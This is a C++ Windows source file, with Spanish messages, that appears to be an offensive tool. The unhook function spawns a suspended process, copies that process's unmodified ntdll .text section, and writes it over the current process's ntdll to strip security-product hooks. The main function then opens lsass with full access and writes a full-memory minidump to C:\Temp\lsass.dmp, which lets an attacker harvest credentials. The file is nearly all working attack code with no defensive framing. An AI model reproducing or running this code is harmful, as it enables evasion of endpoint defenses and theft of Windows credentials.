
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <iostream>
#include <limits>
#include "Source.h"
#include <psapi.h>
#include <DbgHelp.h>
#include <TlHelp32.h>

#pragma comment(lib, "dbghelp.lib")


#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
using namespace std;

int filter(unsigned int code)
{
	if (code == EXCEPTION_STACK_OVERFLOW)
	{
		puts("Overflow\n");
		return EXCEPTION_EXECUTE_HANDLER;
	}
	else
	{
		puts("No se...\n");
		printf("Excepcion: %d\n", code);
		return EXCEPTION_EXECUTE_HANDLER;
	}
}

BOOL unhook(wchar_t * processName);


int wmain(int argc, wchar_t** argv)
{
	DWORD pId = 0;
	if (argc < 2)
	{
			return -1;
	}
	else
	{
		if (wcstoul(argv[1], NULL, 10) != 0)
			goto dumpea;
		if (!unhook(argv[1]))
			return 0;
	}

	dumpea:
	if (argc == 3)
		pId = wcstoul(argv[2], NULL, 10);
	else
	{
		printf("No teastemos lsass\n");
		return 0;
	}
	printf("Testeando lsass\n");
	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pId);
	HANDLE outFile = CreateFile(L"C:\\Temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, pId, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if (isDumped)
		printf("Dumped yeah\n");
	return 1;
	

}
	


BOOL unhook(wchar_t *processName)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	__try
	{

		BOOL hProcbool = CreateProcess(NULL, processName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		HANDLE hProc = pi.hProcess;
		if (hProc == NULL)
		{
			printf("Error: %d\n", GetLastError());
			return 0;
		}

		PEB pPeb;
		PROCESS_BASIC_INFORMATION BasicInfo;

		DWORD dwSize = NULL;

		HMODULE hLibrary = GetModuleHandleW(L"ntdll.dll");
		if (NULL == hLibrary)
			return 0;
		HANDLE process = GetCurrentProcess();
		MODULEINFO mi2 = {};
		GetModuleInformation(process, hLibrary, &mi2, sizeof(mi2));
		FARPROC fpNtQueryInformationProcess = GetProcAddress
		(
			hLibrary,
			"NtQueryInformationProcess"
		);

		if (!fpNtQueryInformationProcess)
			return 0;

		_NtQueryInformationProcess ntQueryInformationProcess =
			(_NtQueryInformationProcess)fpNtQueryInformationProcess;
		NTSTATUS status = (*ntQueryInformationProcess)(hProc, 0, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwSize);
		if (!NT_SUCCESS(status))
		{
			printf("Error: %d\n", GetLastError());
			return 0;
		}
		unsigned long long baseAddress = (unsigned long long)BasicInfo.PebBaseAddress;
		SIZE_T bytesRead;

		BOOL bSuccess = ReadProcessMemory(hProc, (LPCVOID)baseAddress, &pPeb, sizeof(PEB), &bytesRead);
		if (!bSuccess)
		{
			printf("Error: %d\n", GetLastError());
			throw EXCEPTION_STACK_OVERFLOW;
		}
		LPVOID imageBase = pPeb.ImageBaseAddress;
		DWORD old;
		VirtualProtect(imageBase, sizeof(LPVOID), PAGE_READWRITE, &old);

		MEMORY_BASIC_INFORMATION basic;
		LPVOID addr = imageBase;
		char* buffer = new char[100];
		int contador = 1;
		while (VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION)))
		{
			LPVOID oldaddr = addr;
			if (basic.State == MEM_COMMIT && basic.Type == MEM_IMAGE)
			{
				delete[] buffer;
				buffer = new char[basic.RegionSize];
				bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
				if (!bSuccess)
				{
					printf("Error: %d\n", GetLastError());

					return 0;
				}
				for (unsigned int j = 0; j < bytesRead; j++)
				{
					if (buffer[j] == 'M' && buffer[j + 1] == 'Z' && buffer[j + 3] == '\0' && buffer[j + 79] == 'h')
					{


						if (contador == 1)
						{
							if (j != 0)
								addr = LPVOID((unsigned long long)addr + j);
							if (j != 0)
								bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
							if (!bSuccess)
							{
								printf("Error final one: %d\n", GetLastError());
								return 0;
							}
							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((unsigned long long)buffer + pDOSHeader->e_lfanew);
							addr = LPVOID((unsigned long long)addr + ntHeader->OptionalHeader.SizeOfImage);
							contador += 1;
							goto continuar;
						}
						else
						{
							if (j != 0)
								addr = LPVOID((unsigned long long)addr + j);
							if (j != 0)
								bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
							if (!bSuccess)
							{
								printf("Error final one: %d\n", GetLastError());
								return 0;
							}
							//printf("Found ntdll image in: 0x%x.\n", (LPVOID)((unsigned long long)basic.BaseAddress + j));
							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
							PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((unsigned long long)buffer + pDOSHeader->e_lfanew);


							for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
							{
								PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
								if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
								{
									unsigned long long size_section = hookedSectionHeader->Misc.VirtualSize;
									unsigned long long hookedAddr = hookedSectionHeader->VirtualAddress;
									addr = LPVOID((unsigned long long)addr + hookedSectionHeader->VirtualAddress);
									VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION));
									delete[] buffer;
									buffer = new char[basic.RegionSize - 2000];
									bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize - 2000, &bytesRead);
									if (!bSuccess)
									{
										printf("Error reading the last: %d\n", GetLastError());
										return 0;
									}
									/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
									fwrite(buffer, bytesRead, 1, fp);
									fclose(fp);*/
									DWORD oldProtection, oldProtection2 = 0;
									bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, PAGE_EXECUTE_READWRITE, &oldProtection);
									memcpy((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), buffer, basic.RegionSize - 2000);
									isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, oldProtection, &oldProtection2);
									printf("Found section text\n");
									delete[] buffer;
									return 1;
								}
							}
							printf("Sacamos la header\n");
						}

						contador += 1;
					}
				}

			}
		continuar:
			if ((unsigned long long)oldaddr == (long long)addr)
				addr = LPVOID((unsigned long long)addr + (unsigned long long)basic.RegionSize);

		}
	}
	__except (filter(GetExceptionCode()))
	{
		std::cout << "Error convirtiendo datos\n";
		return 0;
	}
		
}